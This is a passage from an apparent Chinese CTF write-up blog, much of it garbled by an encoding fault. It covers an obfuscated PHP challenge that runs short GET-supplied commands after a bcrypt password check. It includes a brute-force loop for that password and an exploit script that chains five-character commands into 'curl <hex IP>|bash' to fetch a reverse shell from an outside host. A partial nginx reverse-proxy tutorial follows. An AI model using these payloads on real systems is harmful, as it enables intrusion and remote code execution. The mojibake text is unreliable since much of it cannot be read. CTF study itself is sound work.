ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜šğŸ˜”ğŸ˜šğŸ˜…ğŸ˜šğŸ˜”ğŸ˜•ğŸ™‡ğŸ˜šğŸ˜–ğŸ˜šğŸ˜“ğŸ˜ªğŸ˜½ğŸ˜»ğŸ˜„ğŸ˜¥ğŸ˜¨ğŸ˜’ğŸ˜›ğŸ˜£ğŸ˜¼ğŸ˜–ğŸ˜¢ğŸ˜²ğŸ˜¥ğŸ™€ğŸ˜•ğŸ˜ğŸ˜»ğŸ˜ªğŸ˜…ğŸ˜²ğŸ˜˜ğŸ˜¦ğŸ™‰ğŸ˜£ğŸ˜½ğŸ˜¦ğŸ™ˆğŸ˜²ğŸ˜¦ğŸ˜‘ğŸ™…ğŸ˜ğŸ˜½ğŸ˜ğŸ˜ğŸ˜²ğŸ˜ºğŸ˜´ğŸ˜€ğŸ˜ªğŸ˜—ğŸ˜‰ğŸ˜œğŸ˜©ğŸ˜ƒğŸ™€ğŸ˜ğŸ˜ğŸ˜¾ğŸ˜©ğŸ˜…ğŸ˜±ğŸ˜–ğŸ˜ğŸ˜ºğŸ˜ªğŸ˜”ğŸ˜¼ğŸ˜†ğŸ˜¢ğŸ˜—ğŸ˜¿ğŸ™ŠğŸ˜´ğŸ˜ğŸ˜¸ğŸ˜¼);</span><br><span class="line"><span class="keyword">if</span>($ğŸ¯-&gt;verify($ğŸ”‘, $ğŸ”’)) &#123;</span><br><span class="line"><span class="keyword">echo</span>(ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜ ğŸ˜“ğŸ˜‰ğŸ˜¹ğŸ˜³ğŸ˜ºğŸ˜…ğŸ˜¡ğŸ˜©ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜´ğŸ˜‚ğŸ˜‰ğŸ™‰ğŸ˜ªğŸ˜“ğŸ˜’ğŸ˜‚ğŸ˜ªğŸ˜¨ğŸ˜šğŸ™€ğŸ˜ªğŸ˜½ğŸ˜¼ğŸ˜¼ğŸ˜ªğŸ˜“ğŸ˜•ğŸ˜ˆğŸ˜œğŸ˜‚ğŸ˜šğŸ™‰ğŸ˜ ğŸ˜·ğŸ˜ğŸ˜));</span><br><span class="line"><span class="keyword">echo</span>(ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜¦ğŸ˜‚ğŸ˜‰ğŸ˜ƒğŸ˜™ğŸ˜£ğŸ˜–ğŸ˜ŸğŸ˜²ğŸ˜ƒğŸ˜³ğŸ™ƒğŸ˜±ğŸ˜—ğŸ˜–ğŸ˜ºğŸ˜±ğŸ™‰ğŸ˜’ğŸ™€ğŸ˜´ğŸ˜“ğŸ˜•ğŸ˜ˆğŸ˜œğŸ˜‚ğŸ˜šğŸ™‰ğŸ˜ ğŸ˜·ğŸ˜ğŸ˜));</span><br><span class="line">ğŸ˜ğŸ˜();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span>(ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜ ğŸ˜“ğŸ˜‰ğŸ˜¹ğŸ˜³ğŸ˜ºğŸ˜…ğŸ˜¡ğŸ˜©ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜´ğŸ˜‚ğŸ˜‰ğŸ™‰ğŸ˜ªğŸ˜“ğŸ˜’ğŸ™…ğŸ˜²ğŸ˜ƒğŸ˜¡ğŸ˜·ğŸ˜²ğŸ˜§ğŸ˜–ğŸ˜€ğŸ˜©ğŸ˜‚ğŸ˜·ğŸ˜¸ğŸ˜ ğŸ˜“ğŸ˜‰ğŸ˜¹ğŸ˜³ğŸ˜ºğŸ˜„ğŸ˜));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯ä»£ç æ ¼å¼åŒ–ï¼Œæ¥ç€å°±æ˜¯<strong>ç†è§£ä»£ç çš„æ‰§è¡Œé€»è¾‘ï¼Œé¡ºä¾¿æ”¹å˜ä»£ç é€»è¾‘</strong></p><p>çœ‹é¢˜è§£ä¸Šçœ‹çš„æ˜¯ç¬¬ä¸€ä¸ªå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æ··æ·†</p><p>ä¸ºä»€ä¹ˆè¦å…ˆçœ‹ç¬¬ä¸€ä¸ªå‡½æ•°</p><p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200929221307190.png" alt="image-20200929221307190"></p><p>æ‰€ä»¥æˆ‘ä»¬å°±æƒ³ç›´æ¥çœ‹åœ¨ä¸åŒå‚æ•°ä¸‹ç¬¬ä¸€ä¸ªå‡½æ•°æ‰§è¡Œè¾“å‡ºçš„ç»“æœï¼Œæ‰€ä»¥åœ¨ç¬¬ä¸€ä¸ªå‡½æ•°ä¸­æ·»åŠ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼<span class="params">($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰)</span> </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"åŠ å¯†åï¼š"</span>.$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰;</span><br><span class="line"><span class="keyword">global</span> $ğŸ,$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…,$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰,$ğŸ,$ğŸ˜±ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜;</span><br><span class="line">$ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…= (<span class="string">"$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…"</span>)($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰)/<span class="number">4</span>;</span><br><span class="line">$ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼ = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> ($ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€ = <span class="number">0</span>;$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€&lt;$ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…;$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€++) &#123;</span><br><span class="line">$ğŸ˜©ğŸ˜‚ğŸ˜¦ğŸ™ƒ =$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">1</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">2</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">3</span>];</span><br><span class="line">$ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€ =<span class="number">0</span>;</span><br><span class="line">$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($ğŸ˜±ğŸ˜½ğŸ™€ğŸ™ =<span class="number">0</span>;$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™&lt;<span class="number">8</span>;$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™++) &#123;</span><br><span class="line"><span class="keyword">for</span> ($ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚=<span class="number">0</span>;$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚&lt;<span class="number">16</span>;$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚++) &#123;</span><br><span class="line"><span class="keyword">if</span>($ğŸ˜©ğŸ˜‚ğŸ˜¦ğŸ™ƒ == $ğŸ[$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™][$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚]) &#123;</span><br><span class="line">$ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€=$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™;</span><br><span class="line">$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º = $ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$ğŸ˜²ğŸ˜¾ğŸ˜¦ğŸ™„ = $ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€*<span class="number">16</span>+$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º;</span><br><span class="line">$ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼ = $ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼.(<span class="string">"$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰"</span>)($ğŸ˜²ğŸ˜¾ğŸ˜¦ğŸ™„);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"åŸæ–‡ï¼š"</span>.(<span class="string">"$ğŸ"</span>)($ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼);</span><br><span class="line"><span class="keyword">return</span> (<span class="string">"$ğŸ"</span>)($ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹‹åä¾æ¬¡ä¿®æ”¹ä»£ç é€»è¾‘ï¼Œæ›¿æ¢å…¶ä¸­ç¬¬ä¸€ä¸ªå‡½æ•°è¾“å‡ºç»“æœ</p><p>æ ¸å¿ƒä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> ğŸ˜ğŸ˜<span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $ğŸ,$strlen,$chr,$base64_decode,$isset;</span><br><span class="line">$path = <span class="string">"/var/www/html/sandbox/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">mkdir($path);</span><br><span class="line">chdir($path);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">@exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">@exec(<span class="string">"rm -rf"</span> . $path);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$ğŸ¯ = <span class="keyword">new</span> Bcrypt();</span><br><span class="line"></span><br><span class="line">$ğŸ”‘ = $_POST[<span class="string">"passwd"</span>];</span><br><span class="line">$ğŸ”’ = <span class="string">"$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe"</span>;</span><br><span class="line"><span class="keyword">if</span>($ğŸ¯-&gt;verify($passwd, $lock)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Password verified!"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Wow!!Now,hack it!"</span>;</span><br><span class="line">ğŸ˜ğŸ˜();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;Password not match!&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå‘ç°æœ‰composeråŒ…ï¼Œå®‰è£…ï¼Œç„¶åæŸ¥èµ„æ–™bcrypt</p><h3 id="bcrypt"><a href="#bcrypt" class="headerlink" title="bcrypt"></a>bcrypt</h3><p><code>bcrypt</code>æ˜¯ä¸€ç§å“ˆå¸Œç®—æ³•ï¼Œå¯ä»¥é€šè¿‡ç¡¬ä»¶è¿›è¡Œæ‰©å±•ï¼ˆé€šè¿‡å¯é…ç½®çš„å¾ªç¯æ¬¡æ•°ï¼‰ã€‚</p><p><strong><code>bcrypt</code>æ˜¯ä¸€ç§å•å‘å“ˆå¸Œç®—æ³•ã€‚</strong>å¦‚æœä¸çŸ¥é“ç›ï¼Œåœ†<strong>å’Œå¯†ç </strong>ï¼ˆå¯†ç ï¼‰ï¼Œåˆ™æ— æ³•æ£€ç´¢çº¯æ–‡æœ¬å¯†ç ã€‚</p><blockquote><p>åŠ ç›ï¼š</p><p>å°±æ˜¯äººä¸ºçš„é€šè¿‡ä¸€ç»„éšæœºå­—ç¬¦ä¸ç”¨æˆ·åŸå¯†ç çš„ç»„åˆå½¢æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ï¼Œä»è€Œå¢åŠ ç ´è¯‘çš„éš¾åº¦ã€‚</p></blockquote><p>åœ¨phpä¸­ï¼Œä¸»è¦æœ‰å†…ç½®çš„å‡½æ•°<code>password_hash</code>å’Œ<code>password_verify</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$a = password_hash(<span class="string">'password'</span>,PASSWORD_DEFAULT);</span><br><span class="line"><span class="keyword">echo</span> $a.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(password_verify(<span class="string">'password'</span>,$a))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"success"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"failed"</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(password_get_info($a));</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¾“å‡ºä¿¡æ¯</span></span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">3</span>)</span><br><span class="line">  <span class="string">'algo'</span> =&gt; int <span class="number">1</span></span><br><span class="line">  <span class="string">'algoName'</span> =&gt; string <span class="string">'bcrypt'</span> (length=<span class="number">6</span>)</span><br><span class="line">  <span class="string">'options'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">      <span class="string">'cost'</span> =&gt; int <span class="number">10</span></span><br><span class="line">$a = password_hash(<span class="string">'password'</span>,PASSWORD_DEFAULT,<span class="keyword">array</span>(<span class="string">'cost'</span> =&gt; <span class="number">11</span>));</span><br><span class="line"><span class="comment">//ç›¸åº”çš„costä¹Ÿä¼šå˜ä¸º11ï¼›</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯çˆ†ç ´ï¼Œå·²çŸ¥å¯†ç ä¸ºbcrypt+4ä½å°å†™å­—æ¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>; </span><br><span class="line"><span class="keyword">use</span> <span class="title">Bcrypt</span>\<span class="title">Bcrypt</span>; </span><br><span class="line">$key = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span>; </span><br><span class="line">$bcrypt = <span class="keyword">new</span> Bcrypt(); </span><br><span class="line">$plaintext = <span class="string">'bcrypt'</span>;<span class="comment">//bcryptyyds </span></span><br><span class="line">$ciphertext = <span class="string">'$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe'</span>; </span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">26</span>;$i++) &#123; </span><br><span class="line">    <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;<span class="number">26</span>;$j++) &#123; </span><br><span class="line">        <span class="keyword">for</span>($k=<span class="number">0</span>;$k&lt;<span class="number">26</span>;$k++) &#123; </span><br><span class="line">            <span class="keyword">for</span>($m=<span class="number">0</span>;$m&lt;<span class="number">26</span>;$m++) &#123; </span><br><span class="line">                <span class="keyword">echo</span> $plaintext.$str.PHP_EOL; </span><br><span class="line">                $str = $key[$i].$key[$j].$key[$k].$key[$m]; </span><br><span class="line">                <span class="keyword">if</span>($bcrypt-&gt;verify($plaintext.$str, $ciphertext))&#123; </span><br><span class="line">                    <span class="keyword">echo</span>(<span class="string">"&lt;/br&gt;Password verified!&lt;/br&gt;"</span>); </span><br><span class="line">                    <span class="keyword">echo</span>(<span class="string">"Wow!!Now,hack it!&lt;/br&gt;"</span>); </span><br><span class="line">                &#125; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><p>æœ€ç»ˆçš„è€ƒç‚¹å°±æ˜¯å‘½ä»¤æ‰§è¡Œå¯ä»¥å‚è€ƒhitcon-ctf-2017</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> ğŸ˜ğŸ˜<span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $ğŸ,$strlen,$chr,$base64_decode,$isset;</span><br><span class="line">$path = <span class="string">"/var/www/html/sandbox/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">mkdir($path);</span><br><span class="line">chdir($path);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">@exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">@exec(<span class="string">"rm -rf"</span> . $path);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜å¤§æ¦‚æ„æ€å°±æ˜¯å­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œä½†å•æ¬¡è¾“å…¥å­—ç¬¦ä¸å¾—å¤§äº5ã€‚å› æ­¤åˆ©ç”¨linuxä¸‹ç‰¹æœ‰çš„å‘½ä»¤æ¥å†™å…¥shellåå¼¹ã€‚åŸç†å°±æ˜¯åˆ©ç”¨curl ip|bashç­‰å¾ˆå¤šæ–¹å¼å»åå¼¹shellã€‚é¡ºä¾¿ä¹Ÿå¤ä¹ äº†åå¼¹shellçš„ä¸€äº›åŸºæœ¬æ“ä½œ</p><p>å®˜æ–¹çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">url = <span class="string">"http://219.219.61.234:10048/?cmd="</span></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate "g&gt; ht- sl" to file "v"</span></span><br><span class="line">    <span class="string">'&gt;dir'</span>,</span><br><span class="line">    <span class="string">'&gt;sl'</span>,</span><br><span class="line">    <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line">    <span class="string">'&gt;ht-'</span>,</span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line">    <span class="comment"># reverse file "v" to file "x", content "ls -th &gt;g" '</span></span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line">    <span class="string">'*v&gt;x'</span>,</span><br><span class="line">    <span class="comment"># generate "curl 0X2761697D|bash"</span></span><br><span class="line">    <span class="string">'&gt;sh '</span>,</span><br><span class="line">    <span class="string">'&gt;ba\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\|\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\\'</span>,</span><br><span class="line">    <span class="string">'&gt;7D\\'</span>,</span><br><span class="line">    <span class="string">'&gt;69\\'</span>,</span><br><span class="line">    <span class="string">'&gt;61\\'</span>,</span><br><span class="line">    <span class="string">'&gt;27\\'</span>,</span><br><span class="line">    <span class="string">'&gt;0X\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\ \\'</span>,</span><br><span class="line">    <span class="string">'&gt;rl\\'</span>,</span><br><span class="line">    <span class="string">'&gt;cu\\'</span>,</span><br><span class="line">    <span class="comment"># got shell</span></span><br><span class="line">    <span class="string">'sh x'</span>,</span><br><span class="line">    <span class="string">'sh g'</span>,</span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">5</span></span><br><span class="line">    data = &#123; <span class="string">'passwd'</span>:<span class="string">'bcryptyyds'</span>, &#125;</span><br><span class="line">    header = &#123; <span class="string">"Content-Type"</span> : <span class="string">"application/x-www-form-urlencoded"</span>,</span><br><span class="line">               <span class="string">"Accept"</span> : <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,ima ge/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"</span>,</span><br><span class="line">               <span class="string">"Upgrade-Insecure-Requests"</span> : <span class="string">"1"</span> &#125;</span><br><span class="line">    r = requests.post(url + urllib.quote(i),data=data,headers=header)</span><br><span class="line">    print(i)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå¾ˆéƒé—·ï¼Œé…ç½®ç¯å¢ƒå¾ˆé•¿æ—¶é—´è¿˜æ˜¯æ²¡èƒ½å¼„å‡ºæ¥</p><h2 id="EZnode"><a href="#EZnode" class="headerlink" title="EZnode"></a>EZnode</h2><p>åº”è¯¥æ˜¯å›½èµ›åˆ†åŒºèµ›çš„é¢˜</p><h3 id="è€ƒç‚¹-3"><a href="#è€ƒç‚¹-3" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><p>nginxåå‘ä»£ç†é…ç½®é”™è¯¯</p><p>é¦–å…ˆæ¥å­¦ä¹ ä¸€ä¸‹ngnix</p><h3 id="ngnix"><a href="#ngnix" class="headerlink" title="ngnix"></a>ngnix</h3><p>ngnixæ˜¯ä¸€æ¬¾è‡ªç”±çš„ã€å¼€æºçš„ã€é«˜æ€§èƒ½çš„HTTPæœåŠ¡å™¨å’Œåå‘ä»£ç†æœåŠ¡å™¨ã€‚</p><p>ä¸»è¦åœ¨ä¸‰ä¸ªæ–¹é¢</p><ul><li>åå‘ä»£ç†</li><li>è´Ÿè½½å‡è¡¡</li><li>nginxç‰¹ç‚¹</li></ul><p><strong>åå‘ä»£ç†</strong></p><blockquote><p>å…ˆè¯´æ­£å‘ä»£ç†</p><p>å®¢æˆ·ç«¯éå¸¸æ˜ç¡®è¦è®¿é—®çš„æœåŠ¡å™¨åœ°å€ï¼›æœåŠ¡å™¨åªæ¸…æ¥šè¯·æ±‚æ¥è‡ªå“ªä¸ªä»£ç†æœåŠ¡å™¨ï¼Œè€Œä¸æ¸…æ¥šæ¥è‡ªå“ªä¸ªå…·ä½“çš„å®¢æˆ·ç«¯ï¼›æ­£å‘ä»£ç†æ¨¡å¼å±è”½æˆ–è€…éšè—äº†çœŸå®å®¢æˆ·ç«¯ä¿¡æ¯ã€‚</p></blockquote><p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20201004160128766.png" alt="image-20201004160128766"></p><p>ä¸Šé¢è¿™ä¸ªå›¾å°±å¾ˆå½¢è±¡äº†</p><p>å¤šä¸ªå®¢æˆ·ç«¯ç»™æœåŠ¡å™¨å‘é€çš„è¯·æ±‚ï¼ŒnginxæœåŠ¡å™¨æ¥æ”¶åˆ°ä¹‹åï¼Œ</p><p>æŒ‰ç…§ä¸€å®šçš„è§„åˆ™åˆ†å‘ç»™äº†åç«¯çš„ä¸šåŠ¡å¤„ç†æœåŠ¡å™¨è¿›è¡Œå¤„ç†äº†ã€‚</p><p>æ­¤æ—¶~è¯·æ±‚çš„æ¥æºä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯æ˜¯æ˜ç¡®çš„ï¼Œä½†æ˜¯è¯·æ±‚å…·ä½“ç”±å“ªå°æœåŠ¡å™¨å¤„ç†çš„å¹¶ä¸æ˜ç¡®äº†ï¼Œnginxæ‰®æ¼”çš„å°±æ˜¯ä¸€ä¸ªåå‘ä»£ç†è§’è‰²</p><p><strong>è´Ÿè½½å‡è¡¡</strong></p><p>åœ¨åå‘ä»£ç†ä¸­</p><p>å®¢æˆ·ç«¯ä¼šå‘æœåŠ¡ç«¯å‘å‡ºè¯·æ±‚ï¼Œè€ŒæœåŠ¡å™¨å°†æ¥å—åˆ°çš„è¯·æ±‚æŒ‰ç…§è§„åˆ™åˆ†å‘çš„è¿‡ç¨‹ï¼Œå°±å«åšè´Ÿè½½å‡è¡¡</p><p><strong>ngnixé…ç½®</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 